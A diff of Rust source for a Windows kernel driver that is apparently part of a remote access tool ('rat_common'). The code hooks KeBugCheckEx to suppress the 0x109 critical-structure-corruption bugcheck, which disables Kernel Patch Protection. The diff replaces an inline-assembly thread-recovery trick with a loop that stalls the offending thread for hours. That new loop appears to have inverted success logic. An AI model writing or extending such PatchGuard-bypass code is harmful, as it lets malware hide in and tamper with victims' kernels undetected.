@@ -1,29 +1,26 @@
 use alloc::boxed::Box;
 use alloc::vec::Vec;
-use core::arch::asm;
 use core::ffi::c_void;
-use core::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
-use core::{mem, ptr, slice};
+use core::sync::atomic::{AtomicPtr, Ordering};
+use core::{ptr, slice};
 
 use rat_common::windows::kernel::KernelHandoff;
+use wdk::nt_success;
+use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
-    IoGetInitialStack, KeBugCheckEx, MmGetSystemRoutineAddress, RtlInitUnicodeString,
+    KeBugCheckEx, KeDelayExecutionThread, KeGetCurrentIrql, MmGetSystemRoutineAddress,
+    RtlInitUnicodeString,
 };
-use wdk_sys::{ULONG, ULONG_PTR, UNICODE_STRING};
+use wdk_sys::{DISPATCH_LEVEL, LARGE_INTEGER, ULONG, ULONG_PTR, UNICODE_STRING};
 use widestring::u16cstr;
 
 use crate::wrappers::bindings::debug_break;
 use crate::wrappers::mdl::MdlGuard;
-use crate::{error, info, warn};
+use crate::{error, info};
 
-type _KeGetCurrentThreadFn = unsafe extern "C" fn() -> *mut u8;
-
-const _KTHREAD_START_ROUTINE_SEARCH_RANGE: usize = 1000;
 const _CRITICAL_STRUCTURE_CORRUPTION: ULONG = 0x109;
 
-static _KE_GET_CURRENT_THREAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
 static _KE_BUG_CHECK_EX_RECOVERY: AtomicPtr<Vec<u8>> = AtomicPtr::new(ptr::null_mut());
-static _KTHREAD_START_ROUTINE_OFFSET: AtomicUsize = AtomicUsize::new(usize::MAX);
 
 #[unsafe(no_mangle)]
 unsafe extern "C" fn ke_bug_check_ex_hook(
@@ -37,36 +34,18 @@ unsafe extern "C" fn ke_bug_check_ex_hook(
         "KeBugCheckEx called with 0x{code:X}, parameters: 0x{parameter_1:X}, 0x{parameter_2:X}, 0x{parameter_3:X}, 0x{parameter_4:X}",
     );
     if code == _CRITICAL_STRUCTURE_CORRUPTION {
-        let ke_get_current_thread = _KE_GET_CURRENT_THREAD.load(Ordering::Acquire);
-        if ke_get_current_thread.is_null() {
-            error!("KeGetCurrentThread address is null");
-            debug_break();
-        }
-
-        let start_routine_offset = _KTHREAD_START_ROUTINE_OFFSET.load(Ordering::Acquire);
-        if start_routine_offset == usize::MAX {
-            error!("KTHREAD StartRoutine offset is not found");
-            debug_break();
-        }
-
-        let thread = unsafe {
-            let ke_get_current_thread =
-                mem::transmute::<*mut u8, _KeGetCurrentThreadFn>(ke_get_current_thread);
-            ke_get_current_thread()
-        };
-        let start_routine = unsafe { thread.cast::<usize>().add(start_routine_offset) };
-        let initial_sp = unsafe { IoGetInitialStack() as usize } & !0xF; // align to 16 bytes
-        info!("Recover thread: start_routine = {start_routine:p}, initial_sp = 0x{initial_sp:X}");
-
-        unsafe {
-            asm! {
-                "mov rsp, {initial_sp}",
-                "mov ecx, 0", // set thread parameter to NULL
-                "jmp {start_routine}",
-                initial_sp = in(reg) initial_sp,
-                start_routine = in(reg) start_routine,
-                options(noreturn),
+        let irql = unsafe { KeGetCurrentIrql() };
+        if u32::from(irql) < DISPATCH_LEVEL {
+            let mut interval = LARGE_INTEGER {
+                QuadPart: -36000000000, // 1 hour
             };
+            loop {
+                let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut interval) };
+                if nt_success(status) {
+                    error!("KeDelayExecutionThread error: 0x{status:X}");
+                    break;
+                }
+            }
         }
     }
 
@@ -108,43 +87,6 @@ unsafe extern "C" fn ke_bug_check_ex_hook(
 
 pub unsafe extern "C" fn disable_kpp_thread_routine(extra: *mut c_void) {
     let extra = unsafe { Box::from_raw(extra.cast::<KernelHandoff>()) };
-    let ke_get_current_thread = unsafe {
-        let mut name = UNICODE_STRING::default();
-        RtlInitUnicodeString(&mut name, u16cstr!("KeGetCurrentThread").as_ptr());
-        MmGetSystemRoutineAddress(&mut name)
-    };
-
-    if ke_get_current_thread.is_null() {
-        error!("Cannot get address of KeGetCurrentThread");
-        return;
-    }
-
-    _KE_GET_CURRENT_THREAD.store(ke_get_current_thread.cast(), Ordering::Release);
-
-    let read = unsafe {
-        let ke_get_current_thread =
-            mem::transmute::<*mut c_void, _KeGetCurrentThreadFn>(ke_get_current_thread);
-        ke_get_current_thread()
-    }
-    .cast::<usize>();
-
-    let mut index = usize::MAX;
-    let search = unsafe { slice::from_raw_parts_mut(read, _KTHREAD_START_ROUTINE_SEARCH_RANGE) };
-    for (i, byte) in search.iter().enumerate() {
-        if *byte == disable_kpp_thread_routine as *mut u8 as usize {
-            info!("Found index of StartRoutine in KTHREAD at 0x{i:X} ({i})");
-            index = i;
-            break;
-        }
-    }
-
-    if index == usize::MAX {
-        warn!("Cannot find offset of StartRoutine in KTHREAD");
-        return;
-    }
-
-    _KTHREAD_START_ROUTINE_OFFSET.store(index, Ordering::Release);
-
     let recovery = unsafe {
         slice::from_raw_parts(
             extra.ke_bug_check_ex.instructions,
